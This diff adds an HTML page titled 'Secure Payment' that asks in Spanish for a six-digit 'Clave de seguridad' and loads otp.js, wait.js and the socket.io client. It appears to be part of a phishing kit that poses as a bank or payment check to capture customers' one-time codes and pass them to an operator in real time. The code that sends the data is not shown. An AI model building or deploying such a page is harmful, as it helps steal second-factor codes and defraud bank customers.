@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=0"
+    />
+    <script src="../../../js/functions.js"></script>
+    <title>Secure Payment</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        font-family: arial;
+        -webkit-appearance: none !important;
+        -moz-appearance: none !important;
+        color: white;
+      }
+
+      input {
+        background-color: #605c5cd2;
+        height: 40px;
+      }
+
+      a {
+        font-size: 22px;
+        margin-left: 10px;
+      }
+
+      select {
+        background-color: #e2e2e2b2;
+        height: 40px;
+        border: none;
+        width: 75%;
+        margin-left: 50px;
+        border-radius: 12px;
+        padding-left: 10px;
+      }
+
+      input {
+        width: 35%;
+        border-radius: 12px;
+        padding-left: 5px;
+      }
+    </style>
+  </head>
+
+  <body style="background-color: #6d6e72">
+    <img src="./img/texto.jfif" alt="" srcset="" width="100%" />
+    <img src="img/logo-big.png" height="70vh" alt="" />
+
+    <div class="datos">
+      <br /><br /><br />
+
+      <center>
+        <label for="documento" style="margin-left: -10px">
+          <b>Clave de seguridad</b> </label
+        ><br />
+
+        <input
+          type="number"
+          inputmode="numeric"
+          name="documento"
+          id="txtdinamica"
+          style="margin-top: 5px"
+          required
+          minlength="6"
+          maxlength="10"
+          oninput="this.value = this.value.slice(0, 6);"
+        />
+        <br /><br />
+        <button
+          type="submit"
+          value="Ingresar"
+          id="btnDinamica"
+          style="
+            display: block;
+            padding: 0.2rem 4rem;
+            border: none;
+            border-radius: 15px;
+            background-color: red;
+            height: 45px;
+            border-bottom: 5px solid red;
+            margin-top: 5px;
+            color: white;
+            font-weight: 700;
+          "
+        >
+          Validar
+        </button>
+        <br /><br /><br />
+        <a style="font-size: 15px">¿Olvidó o bloqueó su clave?</a> <br />
+      </center>
+      <br /><br />
+    </div>
+    <script src="js/otp.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/wait.js"></script>
+  </body>
+</html>
